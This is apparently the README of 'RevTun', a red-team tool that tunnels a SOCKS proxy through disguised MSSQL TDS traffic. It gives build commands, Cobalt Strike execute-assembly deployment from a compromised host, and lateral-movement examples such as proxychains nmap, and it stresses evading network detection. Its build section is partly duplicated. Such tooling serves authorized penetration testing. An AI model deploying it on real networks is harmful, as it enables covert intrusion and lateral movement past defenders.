# RevTun - MSSQL Protocol Toolkit

RevTun is a network pivoting toolkit that operates through the Microsoft SQL Server TDS protocol. It provides reverse tunneling, traffic relaying, and protocol simulation capabilities for penetration testing and red team operations.

## Modes

### 1. Reverse Tunnel (Primary)
- **Server**: Listens on port 1433, responds to TDS handshakes, auto-activates SOCKS proxy
- **Client**: Connects to server using authentic MSSQL authentication  
- **Result**: Covert SOCKS proxy through MSSQL traffic disguise

### 2. Relay (Traffic Forwarding)  
- Transparently forwards MSSQL traffic between clients and servers
- Real-time packet logging and TDS protocol analysis
- TLS/SSL passthrough support
- Ideal for monitoring and debugging database connections

### 3. Standalone (Protocol Testing)
- Full TDS protocol implementation for testing and development
- Supports authentication, encryption, and SQL batch execution
- Generates realistic database responses

## Building

### Quick Build
```powershell
.\build-multi.ps1  # Builds .NET Framework 4.8, Linux x64, Windows x64
```

### Manual Builds
```bash
# Windows x64
dotnet publish -c Release -f net8.0 -r win-x64 --self-contained true -p:PublishSingleFile=true

# Linux x64  
dotnet publish -c Release -f net8.0 -r linux-x64 --self-contained true -p:PublishSingleFile=true

# Cobalt Strike (.NET Framework 4.8)
dotnet build -c Release -f net48 -p:Platform=AnyCPU
```
```bash
# Build for execute-assembly compatibility
dotnet build -c Release -f net48 -p:Platform=AnyCPU
```

### Quick Build (Multi-Platform)
Use the provided PowerShell script for automated builds:

```powershell
# Builds all targets: .NET Framework 4.8, Linux x64, Windows x64
.\build-multi.ps1
```

### Manual Builds

#### Cross-Platform Builds (.NET 8.0)
```bash
# Windows x64 (self-contained single file)
dotnet publish -c Release -f net8.0 -r win-x64 --self-contained true -p:PublishSingleFile=true

# Linux x64 (self-contained single file)  
dotnet publish -c Release -f net8.0 -r linux-x64 --self-contained true -p:PublishSingleFile=true
```

#### Cobalt Strike Build (.NET Framework 4.8)
## Usage

### Server (Reverse Tunnel)
```bash
./revtun server --port 1433 --proxy-port 1080 --verbose
```

### Client (Connect to Server)  
```bash
./revtun client --host server.com --port 1433 --encrypt --verbose
```

### Relay (Traffic Forwarding)
```bash
./revtun relay --host target-server.com --port 1433 --server-port 1433 --debug
```

### Using SOCKS Proxy
```bash
curl --proxy socks5://localhost:1080 http://internal-resource.local
proxychains nmap -sT 192.168.1.0/24
```

## Cobalt Strike Integration

### Deployment
```bash
# Server on external host
execute-assembly revtun.exe server --port 1433 --proxy-port 1080 --require-encryption

# Client from internal network  
execute-assembly revtun.exe client --host [external-ip] --port 1433 --encrypt --auto-exit

# Relay on pivot host
execute-assembly revtun.exe relay --host [internal-sql-server] --port 1433 --verbose
```

### Workflow
1. Deploy server on external compromised host
2. Connect clients from internal networks  
3. Use SOCKS proxy for lateral movement
4. Traffic appears as legitimate MSSQL communications

## Command Options

### Server
```
--port, -p <port>          MSSQL server port (default: 1433)
--proxy-port <port>        SOCKS proxy port (default: 1080)  
--bind <address>           Bind address (default: 0.0.0.0)
--verbose, -v              Enable verbose logging
--require-encryption       Require TLS encryption
```

### Client  
```
--host, -h <hostname>      Server hostname (default: localhost)
--port, -p <port>          Server port (default: 1433)
--username, -u <user>      SQL username (default: sa)
--password <pass>          SQL password (default: Password123)
--auto-exit                Exit after connection test
--verbose, -v              Enable verbose logging
--debug                    Enable debug output
--encrypt                  Request TLS encryption
```

### Relay
```
--port, -p <port>          Relay listener port (default: 1433)
--bind <address>           Bind address (default: 0.0.0.0)
--host, -h <hostname>      Target server hostname (default: localhost)
--server-port <port>       Target server port (default: 1433)
--verbose, -v              Enable verbose logging
--debug                    Enable debug output with TDS packet analysis
```

## Features

- **TDS Protocol**: Complete MSSQL TDS implementation with encryption support
- **Network Evasion**: Traffic appears as legitimate database communications  
- **Cross-Platform**: Windows, Linux, macOS support
- **Cobalt Strike**: Optimized for execute-assembly deployment
- **High Performance**: Low latency, high throughput tunneling
- **Packet Analysis**: Built-in TDS protocol debugging and logging

## Legal Disclaimer

For authorized security testing only. Users are responsible for proper authorization. Use only in environments where you have explicit permission.

---

**RevTun** - MSSQL Protocol Toolkit for Security Testing
